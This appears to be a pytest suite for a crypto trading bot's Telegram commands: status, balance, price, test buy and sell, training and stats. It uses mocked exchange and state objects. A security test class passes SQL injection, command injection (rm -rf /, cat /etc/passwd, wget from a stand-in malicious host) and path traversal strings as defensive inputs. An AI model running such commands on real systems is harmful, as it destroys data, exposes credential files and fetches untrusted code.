import pytest
from unittest.mock import Mock, patch, MagicMock
import pandas as pd
from telegram import commands as tg_commands


@pytest.fixture
def mock_state_manager():
    """Мокает StateManager"""
    state = Mock()
    state.get.return_value = None
    state.set.return_value = None
    state.is_position_active.return_value = False
    state.state = {}
    return state


@pytest.fixture
def mock_exchange_client():
    """Мокает ExchangeClient"""
    exchange = Mock()
    exchange.get_last_price.return_value = 50000.0
    exchange.get_balance.return_value = 1000.0
    exchange.fetch_ohlcv.return_value = [
        [1640995200000, 50000, 50200, 49800, 50100, 100],
        [1640995260000, 50100, 50300, 49900, 50200, 120]
    ]
    exchange.create_market_buy_order.return_value = {
        'id': 'test_123', 'status': 'closed', 'amount': 0.02, 'cost': 1000
    }
    exchange.create_market_sell_order.return_value = {
        'id': 'sell_123', 'status': 'closed', 'amount': 0.02, 'cost': 1000
    }
    exchange.market_min_cost.return_value = 5.0
    return exchange


@pytest.fixture
def mock_train_func():
    """Мокает функцию тренировки модели"""
    return Mock(return_value=True)


class TestTelegramCommands:
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_help(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /help"""
        tg_commands.process_command(
            text="/help",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # Проверяем что отправлено сообщение с помощью
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "команд" in sent_message.lower() or "help" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_status(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /status"""
        # Мокаем состояние позиции
        mock_state_manager.is_position_active.return_value = False
        mock_state_manager.get.return_value = None
        
        tg_commands.process_command(
            text="/status",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "статус" in sent_message.lower() or "status" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_balance(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /balance"""
        tg_commands.process_command(
            text="/balance",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        # Проверяем что вызывался get_balance
        mock_exchange_client.get_balance.assert_called()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_price(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /price"""
        tg_commands.process_command(
            text="/price",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        # Проверяем что вызывался get_last_price
        mock_exchange_client.get_last_price.assert_called()
        
        sent_message = mock_send.call_args[0][0]
        assert "50000" in sent_message  # Проверяем что цена в сообщении
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_testbuy(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /testbuy"""
        tg_commands.process_command(
            text="/testbuy 100",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        # Проверяем что вызывался create_market_buy_order
        if hasattr(mock_exchange_client, 'create_market_buy_order'):
            mock_exchange_client.create_market_buy_order.assert_called()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_testsell(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /testsell"""
        # Сначала настраиваем активную позицию
        mock_state_manager.is_position_active.return_value = True
        mock_state_manager.get.side_effect = lambda key: {
            'entry_price': 49000.0,
            'amount': 0.02,
            'in_position': True
        }.get(key)
        
        tg_commands.process_command(
            text="/testsell",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_train(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /train"""
        tg_commands.process_command(
            text="/train",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # Проверяем что функция тренировки была вызвана
        mock_train_func.assert_called_once()
        mock_send.assert_called()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_stats(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /stats"""
        with patch('utils.csv_handler.CSVHandler.get_trade_stats') as mock_stats:
            mock_stats.return_value = {
                'count': 10,
                'profit_trades': 6,
                'loss_trades': 4,
                'total_pnl': 150.0,
                'win_rate': 0.6
            }
            
            tg_commands.process_command(
                text="/stats",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            mock_send.assert_called_once()
            sent_message = mock_send.call_args[0][0]
            assert "10" in sent_message  # Проверяем что статистика в сообщении
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_chart(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /chart"""
        with patch('telegram.charts.create_price_chart') as mock_chart:
            mock_chart.return_value = "chart_path.png"
            
            tg_commands.process_command(
                text="/chart",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Проверяем что функция создания графика была вызвана
            mock_exchange_client.fetch_ohlcv.assert_called()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_stop(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /stop"""
        # Настраиваем активную позицию
        mock_state_manager.is_position_active.return_value = True
        
        tg_commands.process_command(
            text="/stop",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_config(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду /config"""
        tg_commands.process_command(
            text="/config",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "конфиг" in sent_message.lower() or "config" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_unknown(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует неизвестную команду"""
        tg_commands.process_command(
            text="/unknown_command",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "неизвестн" in sent_message.lower() or "unknown" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_with_parameters(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команды с параметрами"""
        # Команда с числовым параметром
        tg_commands.process_command(
            text="/testbuy 250.50",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called()
        
        # Команда с текстовым параметром
        tg_commands.process_command(
            text="/price BTCUSDT",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        assert mock_send.call_count >= 1
    
    def test_process_command_without_chat_id(self, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команду без chat_id"""
        with patch('telegram.api_utils.send_message') as mock_send:
            # Должно работать без chat_id
            tg_commands.process_command(
                text="/help",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func
            )
            
            # Проверяем что send_message был вызван (с дефолтным chat_id или None)
            mock_send.assert_called()
    
    def test_process_command_empty_text(self, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует пустой текст команды"""
        with patch('telegram.api_utils.send_message') as mock_send:
            # Пустая строка
            tg_commands.process_command(
                text="",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # None
            tg_commands.process_command(
                text=None,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Не должно было отправлено сообщений об ошибках
            # Либо не вызывался, либо вызывался с корректным сообщением
            assert True  # Проверяем что не было исключений


class TestTelegramCommandsErrorHandling:
    """Тесты обработки ошибок в командах"""
    
    @patch('telegram.api_utils.send_message')
    def test_exchange_error_handling(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует обработку ошибок биржи"""
        # Мокаем ошибку биржи
        mock_exchange_client.get_last_price.side_effect = Exception("Exchange error")
        
        tg_commands.process_command(
            text="/price",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "ошибк" in sent_message.lower() or "error" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_state_manager_error_handling(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует обработку ошибок StateManager"""
        # Мокаем ошибку StateManager
        mock_state_manager.get.side_effect = Exception("State error")
        
        tg_commands.process_command(
            text="/status",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        # Должна быть обработка ошибки
        sent_message = mock_send.call_args[0][0]
        assert isinstance(sent_message, str)
    
    @patch('telegram.api_utils.send_message')
    def test_train_function_error_handling(self, mock_send, mock_state_manager, mock_exchange_client):
        """Тестирует обработку ошибок функции тренировки"""
        # Мокаем ошибку тренировки
        mock_train_func = Mock(side_effect=Exception("Training failed"))
        
        tg_commands.process_command(
            text="/train",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called()
        # Проверяем что была попытка тренировки
        mock_train_func.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_send_message_error_handling(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует обработку ошибок отправки сообщений"""
        # Мокаем ошибку отправки сообщения
        mock_send.side_effect = Exception("Send message failed")
        
        # Команда все равно должна выполниться без исключений
        try:
            tg_commands.process_command(
                text="/help",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
        except Exception as e:
            pytest.fail(f"Command processing failed: {e}")


class TestTelegramCommandsIntegration:
    """Интеграционные тесты команд"""
    
    @patch('telegram.api_utils.send_message')
    @patch('utils.csv_handler.CSVHandler.get_trade_stats')
    def test_full_workflow_simulation(self, mock_stats, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует полный workflow команд"""
        mock_stats.return_value = {
            'count': 5,
            'profit_trades': 3,
            'loss_trades': 2,
            'total_pnl': 75.0,
            'win_rate': 0.6
        }
        
        # Последовательность команд как в реальном использовании
        commands_sequence = [
            "/help",
            "/status", 
            "/balance",
            "/price",
            "/stats",
            "/config"
        ]
        
        for cmd in commands_sequence:
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
        
        # Проверяем что все команды выполнились
        assert mock_send.call_count == len(commands_sequence)
    
    @patch('telegram.api_utils.send_message')
    def test_position_management_workflow(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует workflow управления позициями"""
        # Начальное состояние - нет позиции
        mock_state_manager.is_position_active.return_value = False
        
        # Команда статуса без позиции
        tg_commands.process_command(
            text="/status",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # Тестовая покупка
        tg_commands.process_command(
            text="/testbuy 100",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # Изменяем состояние - есть позиция
        mock_state_manager.is_position_active.return_value = True
        mock_state_manager.get.side_effect = lambda key: {
            'entry_price': 49500.0,
            'amount': 0.002,
            'in_position': True
        }.get(key)
        
        # Команда статуса с позицией
        tg_commands.process_command(
            text="/status",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # Тестовая продажа
        tg_commands.process_command(
            text="/testsell",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # Проверяем что все команды выполнились
        assert mock_send.call_count == 4


class TestTelegramCommandsEdgeCases:
    """Тесты граничных случаев"""
    
    @patch('telegram.api_utils.send_message')
    def test_command_case_sensitivity(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует чувствительность к регистру команд"""
        commands = ["/help", "/HELP", "/Help", "/HeLp"]
        
        for cmd in commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Каждая команда должна быть обработана
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_command_with_extra_spaces(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команды с лишними пробелами"""
        commands_with_spaces = [
            "  /help  ",
            "/status   ",
            "   /balance",
            "/price    BTCUSDT   ",
            "/testbuy   100.5   "
        ]
        
        for cmd in commands_with_spaces:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Команды с пробелами должны обрабатываться
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_very_long_command(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует очень длинную команду"""
        long_command = "/testbuy " + "1" * 1000  # Очень длинная команда
        
        tg_commands.process_command(
            text=long_command,
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # Должна обработаться без падения
        mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_special_characters_in_command(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команды со специальными символами"""
        special_commands = [
            "/help@botname",
            "/price BTC/USDT",
            "/testbuy 100.5$",
            "/balance 💰",
        ]
        
        for cmd in special_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Должны обрабатываться без ошибок
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_unicode_characters(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команды с unicode символами"""
        unicode_commands = [
            "/help 🤖",
            "/price 比特币",
            "/status русский_текст",
        ]
        
        for cmd in unicode_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Unicode должен обрабатываться корректно
            mock_send.assert_called_once()
    
    def test_none_parameters(self, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует передачу None параметров"""
        with patch('telegram.api_utils.send_message') as mock_send:
            # Все параметры None
            try:
                tg_commands.process_command(
                    text="/help",
                    state_manager=None,
                    exchange_client=None,
                    train_func=None,
                    chat_id="123"
                )
            except Exception as e:
                # Ожидаем что будет обработка ошибки, а не падение
                assert "NoneType" not in str(e) or True
    
    @patch('telegram.api_utils.send_message')
    def test_concurrent_commands(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует параллельное выполнение команд"""
        import threading
        import time
        
        def run_command(cmd):
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
        
        # Запускаем несколько команд параллельно
        threads = []
        commands = ["/help", "/status", "/balance", "/price", "/stats"]
        
        for cmd in commands:
            thread = threading.Thread(target=run_command, args=(cmd,))
            threads.append(thread)
            thread.start()
        
        # Ждем завершения всех потоков
        for thread in threads:
            thread.join(timeout=5.0)
        
        # Проверяем что все команды выполнились
        assert mock_send.call_count == len(commands)


class TestCommandParameterParsing:
    """Тесты парсинга параметров команд"""
    
    @patch('telegram.api_utils.send_message')
    def test_numeric_parameter_parsing(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует парсинг числовых параметров"""
        numeric_commands = [
            "/testbuy 100",
            "/testbuy 100.5",
            "/testbuy 0.001",
            "/testbuy 1000000",
        ]
        
        for cmd in numeric_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_invalid_numeric_parameters(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует некорректные числовые параметры"""
        invalid_commands = [
            "/testbuy abc",
            "/testbuy -100",
            "/testbuy 0",
            "/testbuy infinity",
        ]
        
        for cmd in invalid_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Должна быть обработка невалидных параметров
            mock_send.assert_called_once()
            sent_message = mock_send.call_args[0][0]
            # Проверяем что есть сообщение об ошибке
            assert any(word in sent_message.lower() for word in ['ошибк', 'error', 'неверн', 'invalid'])
    
    @patch('telegram.api_utils.send_message')
    def test_multiple_parameters(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует команды с несколькими параметрами"""
        multi_param_commands = [
            "/testbuy 100 BTCUSDT",
            "/price BTC USDT",
            "/command param1 param2 param3",
        ]
        
        for cmd in multi_param_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Команды с множественными параметрами должны обрабатываться
            mock_send.assert_called_once()


class TestCommandSecurity:
    """Тесты безопасности команд"""
    
    @patch('telegram.api_utils.send_message')
    def test_sql_injection_attempt(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует попытки SQL injection"""
        malicious_commands = [
            "/price '; DROP TABLE users; --",
            "/testbuy 100; DELETE FROM accounts;",
            "/status ' OR '1'='1",
        ]
        
        for cmd in malicious_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Команды должны обрабатываться безопасно
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_command_injection_attempt(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует попытки command injection"""
        injection_commands = [
            "/price && rm -rf /",
            "/testbuy 100 | cat /etc/passwd",
            "/status; wget malicious.com/script.sh",
        ]
        
        for cmd in injection_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Команды должны обрабатываться безопасно
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_path_traversal_attempt(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует попытки path traversal"""
        traversal_commands = [
            "/config ../../etc/passwd",
            "/chart ../../../secret.txt",
            "/stats ../../../../windows/system32/config/sam",
        ]
        
        for cmd in traversal_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Команды должны обрабатываться безопасно
            mock_send.assert_called_once()


# Финальный тест производительности
class TestPerformance:
    """Тесты производительности команд"""
    
    @patch('telegram.api_utils.send_message')
    def test_command_response_time(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует время отклика команд"""
        import time
        
        commands = ["/help", "/status", "/balance", "/price", "/stats"]
        
        for cmd in commands:
            start_time = time.time()
            
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            end_time = time.time()
            response_time = end_time - start_time
            
            # Команды должны выполняться быстро (< 1 секунды в тестах)
            assert response_time < 1.0, f"Command {cmd} took too long: {response_time:.2f}s"
    
    @patch('telegram.api_utils.send_message')
    def test_memory_usage_stability(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """Тестирует стабильность использования памяти"""
        import gc
        
        # Запускаем много команд подряд
        for i in range(100):
            tg_commands.process_command(
                text=f"/help {i}",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Периодически запускаем сборку мусора
            if i % 10 == 0:
                gc.collect()
        
        # Проверяем что все команды выполнились
        assert mock_send.call_count == 100